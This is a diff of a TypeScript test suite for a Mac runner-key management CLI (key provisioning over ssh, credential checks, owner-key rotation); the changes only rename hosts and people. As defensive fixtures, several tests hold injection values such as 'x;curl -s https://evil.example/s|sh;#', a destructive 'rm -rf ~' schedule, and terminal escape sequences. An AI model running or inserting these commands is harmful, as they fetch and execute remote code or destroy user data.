@@ -10,13 +10,13 @@ import { spawnSync } from 'node:child_process';
 
 const URL_ = 'https://opulent-moose-249.ap-southeast-2.convex.cloud';
 
-const OWN_ID = 'm5runner0001';
+const OWN_ID = 'laptop000001';
 
 // The other Mac's answer to tb runner's look for admin credentials:
 // 'deploy-env', 'cli-login', 'panel <name>', then 'checked'; 'down' is ssh failing.
 let sshCheck = (lines: string[]) => (lines.includes('down') ? { ok: false, out: '', err: 'Connection refused' } : { ok: true, out: [...lines, 'checked'].map((l) => l + '\n').join(''), err: '' });
 
-function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447ea', name: 'bruce' } }, known: string[] = [], remoteFiles: string[] = []) {
+function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447ea', name: 'mac-mini' } }, known: string[] = [], remoteFiles: string[] = []) {
   const home = tmpDir();
   fs.mkdirSync(path.join(home, 'secrets'), { recursive: true });
   fs.writeFileSync(path.join(home, 'secrets', 'convex-key'), 'owner-key\n');
@@ -27,8 +27,8 @@ function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447e
   let rotating = false;
   let nextValue = '';
   const audit: Record<string, Record<string, unknown>[]> = {
-    tokens: [{ kind: 'token', id: 'tokens:1', version: 'v1', name: "Mike's iPhone", tokenKind: 'phone', createdAt: '2026-10-01T00:00:00Z', expiresAt: '2027-10-01T00:00:00Z' }],
-    runnerKeys: [{ kind: 'key', id: 'runnerKeys:1', version: 'v1', runnerId: 'cb921b2447ea', name: 'bruce', createdAt: '2026-11-05T00:00:00Z', mainMac: false }],
+    tokens: [{ kind: 'token', id: 'tokens:1', version: 'v1', name: "Alex's iPhone", tokenKind: 'phone', createdAt: '2026-10-01T00:00:00Z', expiresAt: '2027-10-01T00:00:00Z' }],
+    runnerKeys: [{ kind: 'key', id: 'runnerKeys:1', version: 'v1', runnerId: 'cb921b2447ea', name: 'mac-mini', createdAt: '2026-11-05T00:00:00Z', mainMac: false }],
     schedules: [{ kind: 'schedule', id: 'schedules:1', version: 'u', scheduleId: 'S', runnerId: OWN_ID, title: 'Nightly', text: 'rm -rf ~', cwd: '/', permissionMode: 'full', createdAt: 'c' }],
     runnerSchedules: [],
     cards: [{ kind: 'card', id: 'pocketCards:1', version: 'u', title: 'Deploy', threadId: 'T', updatedAt: 'u' }],
@@ -47,7 +47,7 @@ function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447e
     },
     heads: async () => [{ threadId: 'T', lastSeq: 4 }],
     deployKeys: async () => deployKeys,
-    host: 'm5',
+    host: 'laptop',
     post: async (_kind: string, fn: string, args: Record<string, unknown>) => {
       calls.push({ fn, args });
       if (fn === 'sync:addRunnerKey') return { runnerId: args.runnerId, key: 'tbr_secret_value' };
@@ -57,7 +57,7 @@ function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447e
       if (fn === 'sync:auditRemove') return 1;
       if (fn === 'sync:listRunnerKeys') return { keys: [], rotating };
       if (fn === 'sync:setRunnerLogins') return (args.logins as unknown[]).length;
-      if (fn === 'sync:runnerLogins') return [{ runnerId: 'cb921b2447ea', name: 'bruce\u001b[2J', live: true, shared: [{ provider: 'claude', email: 'mike@example.com' }], claimed: [{ provider: 'claude', email: 'mike@example.com' }, { provider: 'claude', email: 'guess@\u001b]0;x' }] }];
+      if (fn === 'sync:runnerLogins') return [{ runnerId: 'cb921b2447ea', name: 'mac-mini\u001b[2J', live: true, shared: [{ provider: 'claude', email: 'alex@example.com' }], claimed: [{ provider: 'claude', email: 'alex@example.com' }, { provider: 'claude', email: 'guess@\u001b]0;x' }] }];
       return [];
     },
     ssh: (host: string, command: string, input?: string) => {
@@ -76,8 +76,8 @@ function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447e
 
 test("tb runner add --ssh makes a key for that Mac's own runner id and writes it there over stdin", async () => {
   const s = setup();
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 0);
-  assert.deepEqual(s.calls.filter((c) => c.fn === 'sync:addRunnerKey'), [{ fn: 'sync:addRunnerKey', args: { key: 'owner-key', runnerId: 'cb921b2447ea', name: 'bruce', ownerRunnerId: OWN_ID, replace: false } }]);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 0);
+  assert.deepEqual(s.calls.filter((c) => c.fn === 'sync:addRunnerKey'), [{ fn: 'sync:addRunnerKey', args: { key: 'owner-key', runnerId: 'cb921b2447ea', name: 'mac-mini', ownerRunnerId: OWN_ID, replace: false } }]);
   const write = s.sshCalls.find((c) => c.command.includes('convex-key.new'))!;
   assert.equal(write.input, 'tbr_secret_value\n');
   assert.match(write.command, /convex-key\.new" && mv "\$d\/convex-key\.new" "\$d\/convex-key"/);
@@ -90,33 +90,33 @@ const minted = (s: ReturnType<typeof setup>) => s.calls.filter((c) => c.fn === '
 
 test('tb runner add refuses a mismatched id or another deployment, before making anything', async () => {
   let s = setup();
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: 'someoneelse' }, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini', id: 'someoneelse' }, s.deps), 1);
   s = setup({ sync: { url: 'https://other.convex.cloud', runnerId: 'cb921b2447ea' } });
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 1);
   assert.deepEqual(minted(s), []);
   // Somewhere to put it is required: the key is never printed.
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], {}, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], {}, s.deps), 1);
 });
 
 test("a Mac that names this Mac's runner id, or one the deployment has, gets no key unless this Mac says so", async () => {
-  // Bruce's runner.json, tampered with, claims to be the M5.
+  // Mac mini's runner.json, tampered with, claims to be the laptop.
   let s = setup({ sync: { url: URL_, runnerId: OWN_ID } });
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: OWN_ID }, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini', id: OWN_ID }, s.deps), 1);
   assert.deepEqual(minted(s), []);
   // Some other runner the deployment knows: only with --id from this side.
-  s = setup({ sync: { url: URL_, runnerId: 'tinkerdesk01' } }, ['tinkerdesk01']);
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
-  assert.match(s.printed.join('\n'), /--id tinkerdesk01/);
+  s = setup({ sync: { url: URL_, runnerId: 'buildbox0001' } }, ['buildbox0001']);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 1);
+  assert.match(s.printed.join('\n'), /--id buildbox0001/);
   assert.deepEqual(minted(s), []);
   // --id alone isn't enough for a runner the deployment has: it says which, and wants --replace.
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: 'tinkerdesk01' }, s.deps), 1);
-  assert.match(s.printed.join('\n'), /tinkerdesk01-name/);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini', id: 'buildbox0001' }, s.deps), 1);
+  assert.match(s.printed.join('\n'), /buildbox0001-name/);
   assert.match(s.printed.join('\n'), /last seen/);
   assert.match(s.printed.join('\n'), /--replace/);
   assert.deepEqual(minted(s), []);
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: 'tinkerdesk01', replace: true }, s.deps), 0);
-  assert.deepEqual(minted(s), ['tinkerdesk01']);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini', id: 'buildbox0001', replace: true }, s.deps), 0);
+  assert.deepEqual(minted(s), ['buildbox0001']);
   assert.equal(s.calls.find((c) => c.fn === 'sync:addRunnerKey')!.args.replace, true);
   // --out can't name this Mac either.
   s = setup();
@@ -136,7 +136,7 @@ test('a Mac whose runner has no id yet gets one this Mac picks, written into its
 test("a key that couldn't be written over ssh is revoked again", async () => {
   const s = setup();
   s.failWrite();
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 1);
   assert.deepEqual(s.calls.map((c) => c.fn).filter((fn) => /RunnerKey$/.test(fn)), ['sync:addRunnerKey', 'sync:revokeRunnerKey']);
 });
 
@@ -162,23 +162,23 @@ test('a failed ssh says which case it is and the fix', async () => {
   // tb runner add says it too, and a Mac with no Threadbear isn't an ssh problem.
   const s = setup();
   s.deps.ssh = () => ({ ok: false, out: '', err: 'Host key verification failed.' });
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
-  assert.match(s.printed.join('\n'), /ssh -o ForwardAgent=no -o ClearAllForwardings=yes -o ForwardX11=no bruce/);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 1);
+  assert.match(s.printed.join('\n'), /ssh -o ForwardAgent=no -o ClearAllForwardings=yes -o ForwardX11=no mac-mini/);
   assert.deepEqual(s.calls.filter((c) => c.fn === 'sync:addRunnerKey'), []);
   const none = setup();
   none.deps.ssh = () => ({ ok: false, out: '', err: 'cat: /Users/w/Library/Application Support/Threadbear/runner.json: No such file or directory' });
-  assert.equal(await runnerKeysCommand(none.cfg, ['add', 'bruce'], { ssh: 'bruce' }, none.deps), 1);
+  assert.equal(await runnerKeysCommand(none.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, none.deps), 1);
   assert.match(none.printed.join('\n'), /setup --existing/);
   // And tb runner check --ssh.
   const c = setup(undefined, [], ['down']);
-  assert.equal(await runnerKeysCommand(c.cfg, ['check'], { ssh: 'bruce' }, c.deps), 1);
+  assert.equal(await runnerKeysCommand(c.cfg, ['check'], { ssh: 'mac-mini' }, c.deps), 1);
   assert.match(c.printed.join('\n'), /Remote Login/);
 });
 
 test('tb runner add --out writes an owner-only file', async () => {
   const s = setup();
-  const file = path.join(s.cfg.home, 'out', 'bruce.key');
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { out: file, id: 'cb921b2447ea' }, s.deps), 0);
+  const file = path.join(s.cfg.home, 'out', 'mac-mini.key');
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { out: file, id: 'cb921b2447ea' }, s.deps), 0);
   assert.equal(fs.readFileSync(file, 'utf8'), 'tbr_secret_value\n');
   assert.equal(fs.statSync(file).mode & 0o777, 0o600);
   assert.ok(!s.printed.join('\n').includes('tbr_secret_value'));
@@ -239,23 +239,23 @@ test('setup never sets RUNNER_KEY on a joining Mac, and a failed read never look
 test("a Mac whose runner id isn't one as written (spaces, \"any\") gets no key", async () => {
   for (const runnerId of [` ${OWN_ID} `, `${OWN_ID}\n`, 'any', 'a/b']) {
     const s = setup({ sync: { url: URL_, runnerId } });
-    assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1, JSON.stringify(runnerId));
+    assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 1, JSON.stringify(runnerId));
     assert.deepEqual(minted(s), []);
   }
   const s = setup();
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { out: path.join(s.cfg.home, 'k'), id: 'any' }, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { out: path.join(s.cfg.home, 'k'), id: 'any' }, s.deps), 1);
   assert.deepEqual(minted(s), []);
 });
 
 test('tb runner add warns when the other Mac also has a deploy key or a Convex login', async () => {
-  const s = setup(undefined, [], ['deploy-env', 'cli-login', 'panel threadbear-panel-bruce-abc123']);
-  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 0);
+  const s = setup(undefined, [], ['deploy-env', 'cli-login', 'panel threadbear-panel-mac-mini-abc123']);
+  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, s.deps), 0);
   const out = s.printed.join('\n');
   assert.match(out, /convex-deploy\.env/);
   assert.match(out, /convex logout/);
   // Revoke on Convex's side first, by name, then rotate: deleting a file revokes nothing.
   assert.match(out, /[Rr]evoke/);
-  assert.match(out, /deployment token delete threadbear-panel-bruce-abc123 --deployment opulent-moose-249/);
+  assert.match(out, /deployment token delete threadbear-panel-mac-mini-abc123 --deployment opulent-moose-249/);
   assert.match(out, /https:\/\/dashboard\.convex\.dev\/d\/opulent-moose-249\/settings/);
   assert.match(out, /rotate-owner/);
   // Where a CLI login likely came from, and that rotating isn't always needed.
@@ -264,15 +264,15 @@ test('tb runner add warns when the other Mac also has a deploy key or a Convex l
   assert.match(out, /ran threads while it had these/);
   // tb runner check --ssh says the same on its own, and fails.
   const c = setup(undefined, [], ['cli-login']);
-  assert.equal(await runnerKeysCommand(c.cfg, ['check'], { ssh: 'bruce' }, c.deps), 1);
+  assert.equal(await runnerKeysCommand(c.cfg, ['check'], { ssh: 'mac-mini' }, c.deps), 1);
   const clean = setup();
-  assert.equal(await runnerKeysCommand(clean.cfg, ['check'], { ssh: 'bruce' }, clean.deps), 0);
+  assert.equal(await runnerKeysCommand(clean.cfg, ['check'], { ssh: 'mac-mini' }, clean.deps), 0);
   // A look that couldn't be made isn't a clean one.
   const down = setup(undefined, [], ['down']);
-  assert.equal(await runnerKeysCommand(down.cfg, ['check'], { ssh: 'bruce' }, down.deps), 1);
+  assert.equal(await runnerKeysCommand(down.cfg, ['check'], { ssh: 'mac-mini' }, down.deps), 1);
   assert.match(down.printed.join('\n'), /couldn't/i);
-  const panels = setup(undefined, [], ['panel threadbear-panel-bruce-abc123']);
-  assert.equal(await runnerKeysCommand(panels.cfg, ['check'], { ssh: 'bruce' }, panels.deps), 1);
+  const panels = setup(undefined, [], ['panel threadbear-panel-mac-mini-abc123']);
+  assert.equal(await runnerKeysCommand(panels.cfg, ['check'], { ssh: 'mac-mini' }, panels.deps), 1);
 });
 
 test("tb runner check on a Mac with a runner key says if a deploy key is still there", async () => {
@@ -285,10 +285,10 @@ test("tb runner check on a Mac with a runner key says if a deploy key is still t
   // The Convex panel's cached deploy keys count too.
   fs.rmSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'));
   fs.mkdirSync(path.join(s.cfg.home, 'secrets', 'convex-panels'));
-  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-panels', 'opulent-moose-249.json'), JSON.stringify({ name: 'threadbear-panel-bruce-ff00aa', adminKey: 'prod:secret' }));
+  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-panels', 'opulent-moose-249.json'), JSON.stringify({ name: 'threadbear-panel-mac-mini-ff00aa', adminKey: 'prod:secret' }));
   s.printed.length = 0;
   assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
-  assert.match(s.printed.join('\n'), /threadbear-panel-bruce-ff00aa/);
+  assert.match(s.printed.join('\n'), /threadbear-panel-mac-mini-ff00aa/);
   assert.doesNotMatch(s.printed.join('\n'), /prod:secret/);
 });
 
@@ -304,8 +304,8 @@ test('tb runner rotate-owner moves the main key with no gap: NEXT first, this Ma
   fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
   const keyFile = path.join(s.cfg.home, 'secrets', 'convex-key');
   // Keys this Mac made itself, as it recorded them when it made them.
-  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-m5\nthreadbear-panel-m5-a1b2c3\n');
-  s.keys([{ name: 'threadbear-runner-m5', creationTime: 1 }, { name: 'threadbear-panel-m5-a1b2c3', creationTime: 2 }]);
+  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-laptop\nthreadbear-panel-laptop-a1b2c3\n');
+  s.keys([{ name: 'threadbear-runner-laptop', creationTime: 1 }, { name: 'threadbear-panel-laptop-a1b2c3', creationTime: 2 }]);
   assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 0);
   const fresh = fs.readFileSync(keyFile, 'utf8').trim();
   assert.match(fresh, /^[0-9a-f]{64}$/);
@@ -334,7 +334,7 @@ test('tb runner rotate-owner moves the main key with no gap: NEXT first, this Ma
 test("a Mac that joined (its key is a runner key) is never handed the main key or made the owner by setup", () => {
   const set = { status: 0, stdout: 'owner\n', stderr: '' };
   const unset = { status: 0, stdout: '', stderr: '✖ Environment variable "RUNNER_KEY" not found' };
-  // Setup run again on Bruce without --existing still knows it joined.
+  // Setup run again on Mac mini without --existing still knows it joined.
   assert.equal(isJoining({ existing: false, local: 'tbr_mine' }), true);
   assert.equal(isJoining({ existing: true, local: '' }), true);
   assert.equal(isJoining({ existing: false, local: 'owner' }), false);
@@ -367,10 +367,10 @@ test('every ssh to the other Mac turns agent and port forwarding off', async () 
 test('tb runner audit numbers what the old shared key could have left, and --drop takes exact rows by number', async () => {
   const s = setup();
   s.audit.schedules!.push({ kind: 'schedule', id: 'schedules:2', version: 'u', scheduleId: 'x;curl -s https://evil.example/s|sh;#', runnerId: OWN_ID, title: '\u001b[2Kinnocent', text: 'x', cwd: '/', permissionMode: 'full', createdAt: 'c' });
-  s.audit.runnerSchedules!.push({ kind: 'schedule', id: 'schedules:3', version: 'u', scheduleId: 'b', runnerId: 'cb921b2447ea', title: "Bruce's own", text: 'y', createdAt: 'c' });
+  s.audit.runnerSchedules!.push({ kind: 'schedule', id: 'schedules:3', version: 'u', scheduleId: 'b', runnerId: 'cb921b2447ea', title: "Mac mini's own", text: 'y', createdAt: 'c' });
   assert.equal(await runnerKeysCommand(s.cfg, ['audit'], {}, s.deps), 0);
   const out = s.printed.join('\n');
-  for (const want of [/Mike's iPhone/, /rm -rf ~/, /full/, /planted/, /p\.png/, /Bruce's own/]) assert.match(out, want);
+  for (const want of [/Alex's iPhone/, /rm -rf ~/, /full/, /planted/, /p\.png/, /Mac mini's own/]) assert.match(out, want);
   // Nothing anyone else chose goes into a command, and no control characters at all.
   assert.doesNotMatch(out, /\u001b/);
   assert.doesNotMatch(out, /--drop [^\n]*curl/);
@@ -418,12 +418,12 @@ test("setup won't copy or set the main key while a rotation is under way", () =>
 test("rotate-owner won't run while Convex lists a deploy key this Mac didn't make, unless it's been looked at", async () => {
   const s = setup();
   fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
-  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-m5\n');
-  // Bruce's, one with no Mac in its name, and one named to look like this Mac's: none provably this Mac's.
-  s.keys([{ name: 'threadbear-runner-m5', creationTime: 1 }, { name: 'threadbear-runner-bruce', creationTime: 2, lastUsedTime: 3 }, { name: 'threadbear-runner', creationTime: 4 }, { name: 'x; curl evil|sh \u001b[2K', creationTime: 5 }]);
+  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-laptop\n');
+  // Mac mini's, one with no Mac in its name, and one named to look like this Mac's: none provably this Mac's.
+  s.keys([{ name: 'threadbear-runner-laptop', creationTime: 1 }, { name: 'threadbear-runner-mac-mini', creationTime: 2, lastUsedTime: 3 }, { name: 'threadbear-runner', creationTime: 4 }, { name: 'x; curl evil|sh \u001b[2K', creationTime: 5 }]);
   assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 1);
   const out = s.printed.join('\n');
-  assert.match(out, /threadbear-runner-bruce/);
+  assert.match(out, /threadbear-runner-mac-mini/);
   assert.match(out, /threadbear-runner,/);
   assert.match(out, /dashboard\.convex\.dev\/d\/opulent-moose-249\/settings/);
   assert.match(out, /CLI login/);
@@ -457,15 +457,15 @@ test('tb runner check counts a team token left on disk as admin credentials too'
   assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
   assert.match(s.printed.join('\n'), /convex-team-token/);
   const r = setup(undefined, [], ['team-token']);
-  assert.equal(await runnerKeysCommand(r.cfg, ['check'], { ssh: 'bruce' }, r.deps), 1);
+  assert.equal(await runnerKeysCommand(r.cfg, ['check'], { ssh: 'mac-mini' }, r.deps), 1);
   assert.match(r.printed.join('\n'), /team access token/);
 });
 
 test("a remote panel key's name is used only when it looks like one Threadbear made", async () => {
-  const s = setup(undefined, [], ['panel x; curl https://evil.example|sh #', 'panel threadbear-panel-bruce-abc123']);
-  assert.equal(await runnerKeysCommand(s.cfg, ['check'], { ssh: 'bruce' }, s.deps), 1);
+  const s = setup(undefined, [], ['panel x; curl https://evil.example|sh #', 'panel threadbear-panel-mac-mini-abc123']);
+  assert.equal(await runnerKeysCommand(s.cfg, ['check'], { ssh: 'mac-mini' }, s.deps), 1);
   const out = s.printed.join('\n');
-  assert.match(out, /deployment token delete threadbear-panel-bruce-abc123/);
+  assert.match(out, /deployment token delete threadbear-panel-mac-mini-abc123/);
   assert.doesNotMatch(out, /curl/);
   assert.match(out, /unrecognised name/);
 });
@@ -493,10 +493,10 @@ test('the remote admin check still finds a panel key name, quotes and all', () =
   const home = tmpDir();
   const d = path.join(home, 'Library/Application Support/Threadbear/secrets/convex-panels');
   fs.mkdirSync(d, { recursive: true });
-  fs.writeFileSync(path.join(d, 'x.json'), '{"name":"threadbear-panel-bruce-abc123","adminKey":"secret"}');
+  fs.writeFileSync(path.join(d, 'x.json'), '{"name":"threadbear-panel-mac-mini-abc123","adminKey":"secret"}');
   const r = spawnSync(ZSH ?? '/bin/sh', ['-c', remoteCommand(REMOTE_ADMIN_CHECK)], { env: { HOME: home, PATH: '/usr/bin:/bin' }, encoding: 'utf8' });
   assert.equal(r.status, 0, r.stderr);
-  assert.deepEqual(r.stdout.trim().split('\n'), ['panel threadbear-panel-bruce-abc123', 'checked']);
+  assert.deepEqual(r.stdout.trim().split('\n'), ['panel threadbear-panel-mac-mini-abc123', 'checked']);
 });
 
 // The Convex CLI's env commands need a folder whose package.json lists
@@ -527,8 +527,8 @@ test('rotate-owner names every other runner still on the main key, and --finish 
     ...s.deps,
     now: () => now,
     post: async (kind: string, fn: string, args: Record<string, unknown>) => {
-      // Bruce has a key of its own; oldmac hasn't been seen for two months.
-      if (fn === 'sync:listRunnerKeys') return { keys: [{ runnerId: 'cb921b2447ea', name: 'bruce', createdAt: 1 }], rotating: rotatingNow };
+      // Mac mini has a key of its own; oldmac hasn't been seen for two months.
+      if (fn === 'sync:listRunnerKeys') return { keys: [{ runnerId: 'cb921b2447ea', name: 'mac-mini', createdAt: 1 }], rotating: rotatingNow };
       if (fn === 'sync:runnersList') return ((await post(kind, fn, args)) as { runnerId: string; lastSeenAt: number }[]).map((r) => (r.runnerId === 'oldmac000001' ? { ...r, lastSeenAt: now - 60 * 86_400_000 } : r));
       return post(kind, fn, args);
     },
@@ -539,7 +539,7 @@ test('rotate-owner names every other runner still on the main key, and --finish 
   const said = s.printed.join('\n');
   assert.match(said, /befe8df8975c/);
   assert.match(said, /tb runner add "befe8df8975c-name" --ssh <host> --id befe8df8975c --replace/);
-  assert.doesNotMatch(said, /cb921b2447ea/, 'bruce has its own key');
+  assert.doesNotMatch(said, /cb921b2447ea/, 'mac-mini has its own key');
   assert.doesNotMatch(said, /oldmac000001/, 'not seen for 30 days');
   assert.match(said, /--lock-out befe8df8975c/);
   assert.deepEqual(s.convexCalls, []);
@@ -594,21 +594,21 @@ test("rotate-owner doesn't count a runner whose key was revoked and hasn't been 
 // runner shares is the main Mac's word, set here, never its own rows'.
 test('tb runner logins sets exactly the logins given, or none, and lists what each says beside what it shares', async () => {
   const s = setup();
-  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'claude:mike@example.com,codex:mike@example.com'], {}, s.deps), 0);
-  assert.deepEqual(s.calls.at(-1), { fn: 'sync:setRunnerLogins', args: { key: 'owner-key', runnerId: 'cb921b2447ea', logins: [{ provider: 'claude', email: 'mike@example.com' }, { provider: 'codex', email: 'mike@example.com' }] } });
+  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'claude:alex@example.com,codex:alex@example.com'], {}, s.deps), 0);
+  assert.deepEqual(s.calls.at(-1), { fn: 'sync:setRunnerLogins', args: { key: 'owner-key', runnerId: 'cb921b2447ea', logins: [{ provider: 'claude', email: 'alex@example.com' }, { provider: 'codex', email: 'alex@example.com' }] } });
   assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'none'], {}, s.deps), 0);
   assert.deepEqual(s.calls.at(-1)?.args.logins, []);
   // Nothing given, or not provider:email: refused before asking.
   const before = s.calls.length;
   assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea'], {}, s.deps), 1);
-  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'mike@example.com'], {}, s.deps), 1);
-  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'any', 'claude:mike@example.com'], {}, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'cb921b2447ea', 'alex@example.com'], {}, s.deps), 1);
+  assert.equal(await runnerKeysCommand(s.cfg, ['logins', 'any', 'claude:alex@example.com'], {}, s.deps), 1);
   assert.equal(s.calls.length, before);
   s.printed.length = 0;
   assert.equal(await runnerKeysCommand(s.cfg, ['logins'], {}, s.deps), 0);
   const out = s.printed.join('\n');
-  assert.match(out, /shares: +claude:mike@example\.com/);
-  assert.match(out, /says it has: claude:mike@example\.com, claude:guess@/);
+  assert.match(out, /shares: +claude:alex@example\.com/);
+  assert.match(out, /says it has: claude:alex@example\.com, claude:guess@/);
   assert.equal(out.includes('\u001b'), false, 'what that Mac wrote prints with no escapes');
 });
 
@@ -627,7 +627,7 @@ test('tb runner check counts a self-hosted admin key, here or on another Mac', a
   assert.doesNotMatch(s.printed.join('\n'), /convex-self-hosted\|secret/);
   assert.match(REMOTE_ADMIN_CHECK, /convex-self-hosted\.env" \] && echo self-hosted-env/);
   const r = setup(undefined, [], ['self-hosted-env']);
-  assert.equal(await runnerKeysCommand(r.cfg, ['check'], { ssh: 'bruce' }, r.deps), 1);
+  assert.equal(await runnerKeysCommand(r.cfg, ['check'], { ssh: 'mac-mini' }, r.deps), 1);
   assert.match(r.printed.join('\n'), /convex-self-hosted\.env/);
 });
 
@@ -642,10 +642,10 @@ test("tb runner add gives a new Mac a self-hosted backend's website address too"
   assert.equal(json.sync.site, site);
   // A Mac that already has its id and URL but no site (or an old one) gets it too, its id kept.
   for (const old of [undefined, 'https://old.tail1.ts.net:3211']) {
-    const r = setup({ sync: { name: 'bruce', url, runnerId: 'cb921b2447ea', ...(old ? { site: old } : {}) } });
-    assert.equal(await runnerKeysCommand(cfg, ['add', 'bruce'], { ssh: 'bruce' }, r.deps), 0);
+    const r = setup({ sync: { name: 'mac-mini', url, runnerId: 'cb921b2447ea', ...(old ? { site: old } : {}) } });
+    assert.equal(await runnerKeysCommand(cfg, ['add', 'mac-mini'], { ssh: 'mac-mini' }, r.deps), 0);
     const written = JSON.parse(r.sshCalls.find((c) => c.command.includes('runner.json.new'))!.input!);
-    assert.deepEqual(written.sync, { name: 'bruce', url, runnerId: 'cb921b2447ea', site });
+    assert.deepEqual(written.sync, { name: 'mac-mini', url, runnerId: 'cb921b2447ea', site });
   }
 });
 
